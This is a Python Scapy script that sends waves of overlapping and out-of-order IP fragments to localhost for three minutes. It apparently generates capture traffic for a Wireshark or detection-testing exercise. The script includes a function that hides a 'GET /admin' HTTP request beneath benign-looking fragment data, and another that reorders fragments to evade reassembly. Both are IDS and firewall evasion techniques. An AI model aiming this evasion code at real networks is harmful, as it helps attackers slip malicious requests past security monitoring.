#!/usr/bin/env python3
"""
Overlapping Fragment Generator
Sends multiple waves of properly overlapping IP fragments over 3 minutes
"""
from scapy.all import *
import time
import random

def send_overlapping_fragments(target_ip, fragment_id):
    """
    Send a set of overlapping fragments with proper byte-level overlap
    """
    # Fragment 1: offset 0 (bytes 0-15), contains decoy data
    frag1 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=0) / \
            ICMP(type=8, code=0) / \
            Raw(load="AAAAAAAAAAAAAAAA")  # 16 bytes of A's
    
    # Fragment 2: offset 1 (bytes 8-23), overlaps last 8 bytes of frag1
    # This creates TRUE overlap - bytes 8-15 are in both fragments
    frag2 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=1) / \
            Raw(load="BBBBBBBBBBBBBBBB")  # 16 bytes of B's
    
    # Fragment 3: offset 2 (bytes 16-31), overlaps last 8 bytes of frag2
    frag3 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=2) / \
            Raw(load="CCCCCCCCCCCCCCCC")  # 16 bytes of C's
    
    # Fragment 4: offset 3 (bytes 24-39), overlaps last 8 bytes of frag3
    frag4 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=3) / \
            Raw(load="DDDDDDDDDDDDDDDD")  # 16 bytes of D's
    
    # Fragment 5: offset 4 (bytes 32-47), overlaps last 8 bytes of frag4
    frag5 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=4) / \
            Raw(load="EEEEEEEEEEEEEEEE")  # 16 bytes of E's
    
    # Fragment 6: offset 5 (bytes 40-55), final fragment
    frag6 = IP(dst=target_ip, id=fragment_id, flags=0, frag=5) / \
            Raw(load="FFFFFFFFFFFFFFFF")  # 16 bytes of F's
    
    # Send all fragments
    send(frag1, verbose=False)
    send(frag2, verbose=False)
    send(frag3, verbose=False)
    send(frag4, verbose=False)
    send(frag5, verbose=False)
    send(frag6, verbose=False)
    
    return 6  # Return number of fragments sent

def send_malicious_overlapping_http(target_ip, fragment_id):
    """
    Send overlapping fragments that hide a HTTP request
    """
    # Fragment 1: Benign looking data
    frag1 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=0) / \
            TCP(dport=80, sport=random.randint(50000, 60000), flags="PA") / \
            Raw(load="OPTIONS * HTTP")  # 15 bytes - looks benign
    
    # Fragment 2: Overlaps and overwrites with malicious content
    # offset 1 = byte 8, so this overlaps the last 7 bytes of frag1
    frag2 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=1) / \
            Raw(load="GET /admin HTTP")  # 15 bytes - malicious
    
    # Fragment 3: Continues the request
    frag3 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=2) / \
            Raw(load="/1.1\r\nHost: ta")
    
    # Fragment 4: Final fragment
    frag4 = IP(dst=target_ip, id=fragment_id, flags=0, frag=3) / \
            Raw(load="rget.com\r\n\r\n")
    
    send([frag1, frag2, frag3, frag4], verbose=False)
    return 4

def send_out_of_order_overlapping(target_ip, fragment_id):
    """
    Send overlapping fragments OUT OF ORDER to evade reassembly
    """
    fragments = []
    
    # Create fragments (but we'll send them out of order)
    frag1 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=0) / \
            Raw(load="1111111111111111")
    
    frag2 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=1) / \
            Raw(load="2222222222222222")
    
    frag3 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=2) / \
            Raw(load="3333333333333333")
    
    frag4 = IP(dst=target_ip, id=fragment_id, flags="MF", frag=3) / \
            Raw(load="4444444444444444")
    
    frag5 = IP(dst=target_ip, id=fragment_id, flags=0, frag=4) / \
            Raw(load="5555555555555555")
    
    # Send out of order: 3, 1, 5, 2, 4
    send(frag3, verbose=False)
    time.sleep(0.1)
    send(frag1, verbose=False)
    time.sleep(0.1)
    send(frag5, verbose=False)
    time.sleep(0.1)
    send(frag2, verbose=False)
    time.sleep(0.1)
    send(frag4, verbose=False)
    
    return 5

def main():
    target_ip = "127.0.0.1"  # Localhost for safe testing
    duration = 180  # 3 minutes
    start_time = time.time()
    
    fragment_id = random.randint(10000, 65000)
    total_fragments = 0
    wave_count = 0
    
    print("=" * 60)
    print("OVERLAPPING FRAGMENT GENERATOR")
    print("=" * 60)
    print(f"Target IP: {target_ip}")
    print(f"Duration: {duration} seconds (3 minutes)")
    print(f"Start your web browsing now!")
    print("=" * 60)
    print()
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            wave_count += 1
            print(f"[{elapsed}s] Wave {wave_count} - Sending overlapping fragments...")
            
            # Send different types of overlapping fragments
            technique = random.choice(['basic', 'http', 'out_of_order'])
            
            if technique == 'basic':
                frags = send_overlapping_fragments(target_ip, fragment_id)
                print(f"  → Sent {frags} basic overlapping fragments (ID: {fragment_id})")
            elif technique == 'http':
                frags = send_malicious_overlapping_http(target_ip, fragment_id)
                print(f"  → Sent {frags} HTTP obfuscation fragments (ID: {fragment_id})")
            else:
                frags = send_out_of_order_overlapping(target_ip, fragment_id)
                print(f"  → Sent {frags} out-of-order overlapping fragments (ID: {fragment_id})")
            
            total_fragments += frags
            fragment_id += 1
            
            # Random delay between 8-15 seconds
            delay = random.uniform(8, 15)
            print(f"  → Waiting {delay:.1f} seconds... ({remaining}s remaining)\n")
            time.sleep(delay)
    
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
    
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Total waves sent: {wave_count}")
    print(f"Total fragments sent: {total_fragments}")
    print(f"Duration: {int(time.time() - start_time)} seconds")
    print("=" * 60)
    print("\nDone! Check your pcap file in Wireshark.")
    print("Look for packets with 'More fragments' flag and overlapping offsets.")

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This script requires root privileges to send raw packets")
        print("[!] Please run with: sudo python3 overlapping_fragments.py")
        exit(1)
    
    main()
